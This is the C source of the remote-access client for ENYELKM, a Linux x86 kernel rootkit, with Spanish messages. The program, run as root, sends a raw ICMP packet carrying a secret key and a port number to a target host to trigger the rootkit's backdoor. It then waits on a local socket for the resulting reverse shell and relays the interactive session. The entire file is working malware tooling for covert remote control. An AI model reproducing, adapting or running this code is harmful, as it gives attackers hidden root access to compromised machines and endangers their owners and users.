/*
 * ENYELKM v1.1.2
 * Linux Rootkit x86 kernel v2.6.x
 *
 * By RaiSe & David Reguera Garc�a
 * < raise@enye-sec.org 
 * http://www.enye-sec.org >
 *
 * davidregar@yahoo.es - http://www.fr33project.org
 */

#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netdb.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "config.h"


int enviar_icmp(char *ipdestino, unsigned short puerto);


int main(int argc, char *argv[])
{
struct sockaddr_in dire;
unsigned short puerto;
int soc, soc2;
fd_set s_read;
unsigned char tmp;


if(geteuid())
    {
    printf("\nNecesitas ser root (para usar raw sockets).\n\n");
    exit(-1);
    }
 
if (argc < 2)
    {
	printf("\nPrograma para activar el acceso remoto del enyelkm:\n");
	printf("\n%s ip_destino [puerto]\n\n", argv[0]);
	exit(-1);
	}

if (argc > 2)
	puerto = (unsigned short) atoi(argv[2]);
else
	puerto = 8822;


if ((soc = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
    printf("error al crear el socket.\n");
    exit(-1);
    }

bzero((char *) &dire, sizeof(dire));

dire.sin_family = AF_INET;
dire.sin_port = htons(puerto);
dire.sin_addr.s_addr = htonl(INADDR_ANY);

while(bind(soc, (struct sockaddr *) &dire, sizeof(dire)) == -1)
	dire.sin_port = htons(++puerto);

listen(soc, 5);

printf("\n* Lanzando reverse_shell:\n\n");
fflush(stdout);

enviar_icmp(argv[1], puerto);

printf("Esperando shell en puerto %d (puede tardar unos segundos) ...\n", (int) puerto);
fflush(stdout);
soc2 = accept(soc, NULL, 0);
printf("lanzando shell ...\n\n");
printf("id\n");
fflush(stdout);
write(soc2, "id\n", 3);


while(1)
    {
    FD_ZERO(&s_read);
	FD_SET(0, &s_read);
    FD_SET(soc2, &s_read);

    select((soc2 > 0 ? soc2+1 : 0+1), &s_read, 0, 0, NULL);

    if (FD_ISSET(0, &s_read))
        {
        if (read(0, &tmp, 1) == 0)
            break;
        write(soc2, &tmp, 1);
        }

    if (FD_ISSET(soc2, &s_read))
        {
        if (read(soc2, &tmp, 1) == 0)
            break;
        write(1, &tmp, 1);
        }

    } /* fin while(1) */


exit(0);

} /***** fin de main() *****/


int enviar_icmp(char *ipdestino, unsigned short puerto)
{
int soc, n, tot;
long sum;
unsigned short *p;
struct sockaddr_in adr;
unsigned char pqt[4096];
struct iphdr *ip = (struct iphdr *) pqt;
struct icmphdr *icmp = (struct icmphdr *)(pqt + sizeof(struct iphdr));
char *data = (char *)(pqt + sizeof(struct iphdr) + sizeof(struct icmphdr));

bzero(pqt,4096);
bzero(&adr, sizeof(adr));
strcpy(data, ICMP_CLAVE);
p = (unsigned short *)((void *)(data + strlen(data)));
*p = puerto;

tot = sizeof(struct iphdr) + sizeof(struct icmphdr) + strlen(ICMP_CLAVE) + sizeof(puerto);

if((soc=socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) == -1)
	{
	perror("Error al crear el socket.\n");
	exit(-1);
	}

adr.sin_family = AF_INET;
adr.sin_port = 0;
adr.sin_addr.s_addr = inet_addr(ipdestino);

ip->ihl = 5;
ip->version = 4;
ip->id = rand() % 0xffff;
ip->ttl = 0x40;
ip->protocol = 1;
ip->tos = 0;
ip->tot_len = htons(tot);
ip->saddr = 0;
ip->daddr = inet_addr(ipdestino);

icmp->type = ICMP_ECHO;
icmp->code = 0;
icmp->un.echo.id = getpid() && 0xffff;
icmp->un.echo.sequence = 0;

printf("Enviando ICMP ...\n");
fflush(stdout);

n = sizeof(struct icmphdr) + strlen(ICMP_CLAVE) + sizeof(puerto);
icmp->checksum = 0;
sum = 0;
p = (unsigned short *)(pqt + sizeof(struct iphdr));

while (n > 1)
	{
	sum += *p++;
	n -= 2;
	}

if (n == 1)
	{
	unsigned char pad = 0;
	pad = *(unsigned char *)p;
	sum += (unsigned short) pad;
	}

sum = ((sum >> 16) + (sum & 0xffff));
icmp-> checksum = (unsigned short) ~sum;

if ((n = (sendto(soc, pqt, tot, 0, (struct sockaddr*) &adr,
    sizeof(adr)))) == -1)
	{
	perror("Error al enviar datos.\n");
	exit(-1);
	}
	

return(0);

} /********* fin de enviar_icmp() ********/	


/* EOF */
